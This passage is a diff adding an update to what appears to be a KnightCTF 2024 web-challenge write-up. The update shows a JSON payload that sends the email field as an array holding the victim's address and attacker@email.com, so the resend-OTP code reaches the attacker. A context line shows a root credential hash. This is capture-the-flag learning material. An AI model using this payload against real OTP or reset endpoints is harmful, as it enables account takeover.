@@ -544,6 +544,49 @@ root@knightctf.com:d05fcd90ca236d294384abd00ca98a2d
 	
 ></p>
 <p>I got stuck here , will update when the ctf ends. :)</p>
+<p>Update:</p>
+<p>After you get the password , there is ana OTP page . The page also has an option to resend otp which requires you to enter an email. If we eneter the email <a class="link" href="mailto:roor@knightctf.com" >roor@knightctf.com</a>. That we had earlier we can see that it accepts it.
+Note:  I had tries this methos earlier but i used the wrong format.</p>
+<p><img src="https://github.com/T3l3sc0p3/ctf-writeups/blob/master/KnightCTF-2024/Web/img/gain-access-2-resend-code.png"
+	
+	
+	
+	loading="lazy"
+	
+		alt="reset"
+	
+	
+></p>
+<p>So you can send several email as an array []</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span><span class="lnt">2
+</span><span class="lnt">3
+</span><span class="lnt">4
+</span><span class="lnt">5
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-json" data-lang="json">
+<span class="p">{</span>
+    <span class="nt">&#34;email&#34;</span><span class="p">:</span> <span class="p">[</span><span class="s2">&#34;root@knightctf.com&#34;</span><span class="p">,</span><span class="s2">&#34;attacker@email.com&#34;</span><span class="p">]</span>
+<span class="p">}</span>
+
+</code></pre></td></tr></table>
+</div>
+</div><p>This will send the OTP code to both emails. Using the OTP code we get the flag</p>
+<p><img src="https://github.com/T3l3sc0p3/ctf-writeups/blob/master/KnightCTF-2024/Web/img/gain-access-2-flag.png"
+	
+	
+	
+	loading="lazy"
+	
+		alt="flag"
+	
+	
+></p>
+<p>CREDIT: @<a class="link" href="https://github.com/T3l3sc0p3"  target="_blank" rel="noopener"
+    >T3l3sc0p3</a></p>
 <hr>
 <h3 id="networking">Networking</h3>
 <p>For the networking challs check out my teammates writeups on them &raquo;&gt;</p>
